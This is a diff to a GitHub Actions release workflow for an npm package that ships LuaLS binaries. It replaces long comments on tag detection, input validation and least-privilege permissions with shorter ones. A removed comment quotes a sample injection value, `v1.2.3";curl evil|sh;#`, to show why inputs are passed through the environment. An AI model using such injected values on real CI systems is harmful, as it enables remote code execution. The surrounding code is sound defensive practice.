@@ -3,17 +3,9 @@ name: Release
 on:
   workflow_run:
     workflows: ["CI"]
-    # There is deliberately NO `branches:` filter here. For `workflow_run`, the
-    # `branches`/`branches-ignore` filters are matched against the branch the
-    # TRIGGERING workflow ran on, which for a tag push is the tag name (carried in
-    # `workflow_run.head_branch`) — it is not a branch at all. CI runs on release
-    # tag pushes, and a tag like "v2.6.1" never matches [master, main], so keeping
-    # the filter silently dropped every tag-triggered CI run and left the release
-    # depending on the racy branch-push run (or on a manual workflow_dispatch).
-    # Safety comes from the job-level `if:` below (same repository, push event,
-    # conclusion == success) plus the tag detection, which sets is_release=false
-    # and skips every later step when HEAD carries no release tag.
-    # See https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_run
+    # No `branches:` filter on purpose: it matches the triggering run's branch and
+    # a tag push reports the tag name, so tag-triggered CI would be dropped. The
+    # job `if:` plus tag detection below decide whether anything is released.
     types:
       - completed
   workflow_dispatch:
@@ -34,10 +26,7 @@ jobs:
         github.event.workflow_run.event == 'push' &&
         github.event.workflow_run.head_repository.full_name == github.repository
       )
-    # Least privilege: this job creates the GitHub release and force-pushes the
-    # floating major tag, so it needs contents: write. It deliberately does NOT get
-    # id-token: write (the workflow-level permissions block was removed) — only the
-    # separate `publish-npm` job may mint OIDC tokens for trusted publishing.
+    # contents: write for the release and floating tag; id-token stays with publish-npm.
     permissions:
       contents: write
     outputs:
@@ -53,9 +42,7 @@ jobs:
       - name: Detect Release Tag
         id: tag
         env:
-          # Passed through the environment and referenced as a quoted shell variable.
-          # `${{ github.event.inputs.* }}` must never be interpolated into `run:` text:
-          # a value like `v1.2.3";curl evil|sh;#` would be executed by the shell.
+          # Via env (never interpolated into `run:` text): prevents command injection.
           TAG_INPUT: ${{ github.event.inputs.tag }}
         run: |
           set -euo pipefail
@@ -63,10 +50,7 @@ jobs:
           if [ -n "${TAG_INPUT}" ]; then
             TAG="$TAG_INPUT"
           else
-            # End-anchored so that e.g. "v1.2.3-evil" is not accepted as a release tag.
-            # `|| true` keeps the expected "no tag on this commit" case from failing the
-            # step (the default bash shell already runs with -e -o pipefail, and grep
-            # exits 1 when there is no match).
+            # End-anchored; `|| true` keeps "no tag" from failing under -e -o pipefail.
             TAG=$(git tag --points-at HEAD | grep -E '^v?[0-9]+\.[0-9]+\.[0-9]+$' | head -n 1 || true)
           fi
 
@@ -96,9 +80,7 @@ jobs:
           node-version: 24
           registry-url: 'https://registry.npmjs.org'
 
-      # Fail fast, before anything is packaged or published: `npm publish` takes the
-      # version from package.json, so a tag that disagrees with it would produce
-      # mislabeled archives and publish a version nobody asked for.
+      # Fail before packaging: npm publish takes the version from package.json.
       - name: Verify tag matches package.json version
         if: steps.tag.outputs.is_release == 'true'
         env:
@@ -140,8 +122,7 @@ jobs:
             })
             .catch(() => console.log('3.19.1'));
           ")
-          # The tag is an external API response: only accept a plain version token before it is
-          # interpolated into shell commands, URLs and archive file names (command injection).
+          # External API value: only a plain version token may reach URLs/file names.
           case "$LUALS_VERSION" in
             ""|.|..|*[!0-9A-Za-z._-]*)
               echo "Refusing to use unexpected LuaLS version: '${LUALS_VERSION}'" >&2
@@ -157,12 +138,9 @@ jobs:
           esac
           mkdir -p release-builds
 
-          # Verify the architecture of a bundled LuaLS binary directly from its
-          # executable header. The release job runs on x64, so it can never execute
-          # the arm64 binaries; this check guarantees a mislabeled package (e.g. an
-          # x64 binary inside the linux-arm64 archive) is never published. Running
-          # the foreign-architecture binaries for real is covered by the
-          # `ubuntu-26.04-arm` job in .github/workflows/ci.yml.
+          # This job is x64 and cannot run the arm64 binaries, so check the
+          # executable header to catch a mislabeled package (real arm64 runs are
+          # covered by the ubuntu-26.04-arm CI job).
           verify_binary_arch() {
             node -e '
               const fs = require("node:fs");
@@ -355,10 +333,8 @@ jobs:
             git push origin "$MAJOR" --force
           fi
 
-  # Publishing runs in its own job so that `id-token: write` (needed to mint the
-  # OIDC token for npm trusted publishing) is scoped to this job alone: the release
-  # job and every curl/download step above never hold that capability. No
-  # NODE_AUTH_TOKEN/NPM_TOKEN secret is used or needed.
+  # Own job so `id-token: write` (npm trusted publishing) is not granted to the
+  # release job or its download steps. No NPM_TOKEN is used.
   publish-npm:
     name: Publish to npm
     needs: build-and-release
@@ -385,8 +361,6 @@ jobs:
       - name: Build distribution package
         run: npm run build
 
-      # The published version comes from the checked-out package.json (never a
-      # hardcoded version here); the build job's version guard has already failed the
-      # workflow when the detected tag and package.json disagree.
+      # Version comes from package.json; the build job already validated the tag.
       - name: Publish to npm
         run: npm publish --access public
